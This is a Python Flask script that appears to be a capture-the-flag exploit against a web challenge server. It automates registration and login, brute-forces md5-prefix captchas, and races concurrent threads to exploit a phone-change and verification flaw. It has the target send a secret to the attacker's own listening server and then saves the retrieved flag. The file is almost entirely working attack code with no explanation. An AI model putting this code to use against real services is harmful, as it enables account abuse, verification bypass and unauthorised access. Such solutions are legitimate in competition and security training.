from flask import Flask, request
import time
import socket
from os import urandom, remove
import requests
import urllib
import threading
from hashlib import md5



ip = requests.get('http://ip.42.pl/raw').text
print 'The secret will be sent at: %s' % ip

app = Flask(__name__)

def captcha_solver(challenge):
	idx = 0
	while 1:
		if challenge == md5(str(idx)).hexdigest()[:6]:
			return str(idx)
		idx += 1

def create_account(user, password, phone):
	sess = urandom(13).encode('hex')
	headers = {"User-Agent":"Mozilla/5.0", "Content-Type":"application/x-www-form-urlencoded","Cookie":"PHPSESSID=" + sess}
	data = "username=%s&password=%s&phone=%s&submit=" % (urllib.quote(user),urllib.quote(password),urllib.quote(phone))
	requests.post("http://202.120.7.196:2333/register.php", headers=headers, data=data)

def auth(user, password, sess=""):
	if sess == "": #generate session
		sess = urandom(13).encode('hex')
	headers = {"User-Agent":"Mozilla/5.0", "Content-Type":"application/x-www-form-urlencoded","Cookie":"PHPSESSID=" + sess }
	data = "username=%s&password=%s&submit=" % (urllib.quote(user),urllib.quote(password))
	requests.post("http://202.120.7.196:2333/login.php", headers=headers, data=data)
	return sess

def verify_account(user, password, secret, session=""):
	generated = False
	if session == "": #generate session
		session = auth(user,password)
		generated = True
	headers = {"User-Agent":"Mozilla/5.0", "Content-Type":"application/x-www-form-urlencoded","Cookie":"PHPSESSID=" + session }
	data = "code=%s&submit=" % secret
	requests.post("http://202.120.7.196:2333/verify.php", headers=headers, data=data, allow_redirects=True)
	
	if generated:
		sess1 = session
		sess2 = auth(user, password) # create a second session, we already have one at var 'sess1', just after the verify process
		race_condition(sess1, sess2) # try to exploit the race condition
	else: #save flag
		f = open("flag","w")
		f.write("session: " + session) #For manual verification; we are not sure about the flag format
		f.write(requests.get("http://202.120.7.196:2333/index.php",headers={"User-Agent":"Mozilla/5.0", "Cookie":"PHPSESSID=" + session }).text)
		f.close()

def captcha_solution(session):
	headers = {"User-Agent":"Mozilla/5.0", "Cookie":"PHPSESSID=" + session }
	captcha_chall = requests.get("http://202.120.7.196:2333/change.php", headers=headers).text
	solution = captcha_solver((captcha_chall.split("=== '"))[1].split("').")[0])
	return solution

def change_phone(phone, session, solution):
	headers = {"User-Agent":"Mozilla/5.0", "Content-Type":"application/x-www-form-urlencoded","Cookie":"PHPSESSID=" + session }
	resp = requests.post("http://202.120.7.196:2333/change.php", headers=headers, data="task=%s&phone=%s" % (solution,phone)).text

def race_condition(sess1,sess2):
	global ip
	solution1 = captcha_solution(sess1)
	solution2 = captcha_solution(sess2)
	f = open("vars","w")
	f.write(sess2+","+solution2+"\r\n"+ sess1)
	f.close()
	change_phone(ip, sess1, solution1)


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET','HEAD'])
def index(path):
	global ip

	secret = ""
	for key,value in request.args.items():
		try:
			if request.method == 'HEAD':
				secret = key
		except:
			continue
		break

	if path == "" and len(secret) == 32 and request.method == 'HEAD':
		if request.authorization:
			auth = request.authorization
			t = threading.Thread(target=verify_account, args=(auth.username, auth.password,secret, ))
			t.start()
		else: #RACE CONDITION EXPLOIT
			#We don't have basic authorization header, because we use it only at register page and now we try to exploit the race condition
			#First we send the request to change our phone with 8.8.8.8 and then we confirm our phone.
			sess2, solution2 = open("vars","r").read().split("\r\n")[0].split(",")
			sess1 = open("vars","r").read().split("\r\n")[1]
			remove("vars") # delete vars file
			#Send change phone to google on one thread (We have 3 seconds to confirm with the code we took from our ip, secret variable)
			t1 = threading.Thread(target=change_phone, args=("8.8.8.8", sess2, solution2, ))
			t2 = threading.Thread(target=verify_account, args=("", "", secret, sess1, ))
			t1.start()
			t2.start()

		return secret


	if path == "solve":
		user = urandom(4).encode('hex')
		password = urandom(4).encode('hex')
		phone = user + ":" + password + "@" + ip
		create_account(user, password, phone)
		return ("3c21444f43545950452068746d6c3e0a3c68746d6c3e0a3c686561643e0a202020203c736372697074207372633d2268747470733a2f2f636f64652e6a7175657279" +\
		"2e636f6d2f6a71756572792d322e312e342e6d696e2e6a73223e3c2f7363726970743e0a3c2f686561643e0a3c626f64793e0a3c7363726970743e0a66756e6374696f6e206" +\
		"765745f666c616728297b0a20202020242e616a6178287b0a20202020747970653a2022474554222c0a2020202075726c3a20222f666c6167222c0a20202020737563636573" +\
		"733a2066756e6374696f6e2864617461297b0a20202020202020206966202820646174612e696e6465784f66282773657373696f6e2729203e202d312029207b0a202020202" +\
		"020202020202020766172206d736732203d20646174613b0a2020202020202020202020202428202223666c61672220292e617070656e6428206d73673220290a2020202020" +\
		"20202020202020636c656172496e74657276616c2874696d6572293b0a20202020202020207d0a2020202020202020656c73657b0a202020202020202020202020242820222" +\
		"3666c61672220292e617070656e642820222220290a2020202020202020202020207d0a202020207d0a202020207d293b0a7d0a0a74696d6572203d20736574496e74657276" +\
		"616c286765745f666c61672c2032303030293b0a3c2f7363726970743e0a3c6469762069643d22666c616722203e3c2f6469763e0a3c2f626f64793e0a3c2f68746d6c3e").decode('hex')

	if path == "flag":
		try:
			f = open("flag","r").read()
		except:
			return ""
		return f

	return ""

if __name__ == "__main__":
	app.run(host='0.0.0.0', port=80)